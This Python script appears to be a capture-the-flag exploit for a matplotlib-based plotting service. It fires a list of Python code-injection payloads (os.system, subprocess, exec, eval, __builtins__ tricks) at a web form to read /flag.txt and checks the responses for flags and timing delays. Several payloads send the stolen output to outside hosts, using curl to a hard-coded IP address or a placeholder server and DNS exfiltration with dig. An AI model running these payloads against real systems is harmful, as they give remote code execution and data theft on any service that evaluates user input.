#!/usr/bin/env python3
import requests
import time
import urllib.parse


def test_blind_injections(target_url, form_field='data'):
    """
    Test various blind injection payloads against a target URL that uses matplotlib/Python

    Args:
        target_url: The URL to target
        form_field: The name of the form field to inject into
    """
    # Base payloads to test
    payloads = [
        # Basic function with injection
        "x**2; __import__('os').system('cat /flag.txt')",

        # Using subprocess
        "x**2; __import__('subprocess').check_output(['cat', '/flag.txt'])",

        # Via matplotlib
        "x**2; import matplotlib.pyplot as plt; plt.savefig('/dev/null'); __import__('os').system('cat /flag.txt')",

        # Using eval directly
        "eval('__import__(\"os\").system(\"cat /flag.txt\")')",

        # Time-based blind techniques
        "x**2; __import__('os').system('cat /flag.txt') or __import__('time').sleep(5)",

        # Exfiltration techniques (replace with your server)
        "x**2; __import__('os').system('cat /flag.txt | curl -d @- http://130.136.4.142:8000')",

        # Using Python's exec function
        "x**2; exec(\"import os; os.system('cat /flag.txt')\")",

        # File write technique
        "x**2; open('/tmp/flag_content', 'w').write(open('/flag.txt').read())",

        # More stealthy approach
        "x**2 + (lambda: __import__('os').system('cat /flag.txt > /tmp/data') or 0)()",

        # Using globals/locals
        "x**2; __builtins__.__dict__['__import__']('os').system('cat /flag.txt')"
    ]

    s = requests.Session()

    s.get(target_url)

    # Try each payload
    for i, payload in enumerate(payloads):
        print(f"[{i+1}/{len(payloads)}] Testing: {payload}")

        # URL encode the payload
        # encoded_payload = urllib.parse.quote(payload)

        # Prepare the data to send
        data = {form_field: payload}

        try:
            # Send the request
            start_time = time.time()
            response = s.post(
                target_url + '/render', data=data, timeout=10)
            end_time = time.time()

            # Check the response
            print(f"  Request URL: {response.url}")
            print(f"  Request Headers: {response.request.headers}")
            print(f"  Status Code: {response.status_code}")
            print(f"  Text: {response.text}")
            print(f"  Response Time: {end_time - start_time:.2f} seconds")

            # Look for potential indicators of success
            if "flag{" in response.text or "CCIT{" in response.text:
                print("  [!] POSSIBLE FLAG FOUND IN RESPONSE:")
                extract_flag(response.text)

            # Check for error messages that might reveal helpful information
            if "Error" in response.text or "Exception" in response.text:
                print(
                    "  [+] Error message detected - might provide helpful information:")
                print(f"  {response.text[:200]}...")

            # If the response is very slow, it might indicate a successful time-based injection
            if end_time - start_time > 4.5:
                print(
                    "  [!] Time-based injection might have worked (response was delayed)")

        except requests.exceptions.Timeout:
            print(
                "  [!] Request timed out - possible indication of success for time-based payloads")
        except requests.exceptions.RequestException as e:
            print(f"  [-] Request failed: {e}")

        print("-" * 60)
        # Delay between requests to avoid overwhelming the server
        time.sleep(1)


def extract_flag(content):
    """Extract and print potential flag patterns"""
    import re

    # Common flag formats
    flag_patterns = [
        r'flag{[^}]+}',
        r'CTF{[^}]+}',
        r'Flag: [A-Za-z0-9_]+',
        r'key: [A-Za-z0-9_]+',
        r'CCIT{[^}]+}',
    ]

    for pattern in flag_patterns:
        matches = re.findall(pattern, content)
        for match in matches:
            print(f"    {match}")


def test_command_exfiltration(target_url, command, form_field='data'):
    """
    Test a specific command with data exfiltration methods

    Args:
        target_url: The URL to target
        command: The command to execute (e.g., 'cat /flag.txt')
        form_field: The name of the form field to inject into
    """
    # Set up your exfiltration methods
    exfil_methods = [
        # DNS exfiltration - replace example.com with your domain
        f"x**2; __import__('os').system('{
            command} | xxd -p | tr -d \"\\n\" | xargs -I{{}} dig {{}}.example.com')",

        # HTTP POST exfiltration - replace with your server
        f"x**2; __import__('os').system('{
            command} | curl -d @- http://your-server.com/exfil')",

        # Base64 encoding for binary data
        f"x**2; __import__('os').system('{
            command} | base64 | curl -d @- http://your-server.com/exfil')"
    ]

    print(f"Testing exfiltration methods for command: {command}")
    for method in exfil_methods:
        print(f"Trying: {method}")

        # URL encode the payload
        # encoded_payload = urllib.parse.quote(method)

        # Prepare the data to send
        data = {form_field: method}

        try:
            response = requests.post(target_url, data=data, timeout=10)
            print(f"  Status Code: {response.status_code}")
        except Exception as e:
            print(f"  Error: {e}")

        print("-" * 60)
        time.sleep(1)


if __name__ == "__main__":
    # Replace with your target URL
    target = "http://plottyboy.challs.cyberchallenge.it"

    # Run the tests
    test_blind_injections(target)

    # Optional: Test specific command with exfiltration methods
    # test_command_exfiltration(target, "cat /flag.txt")
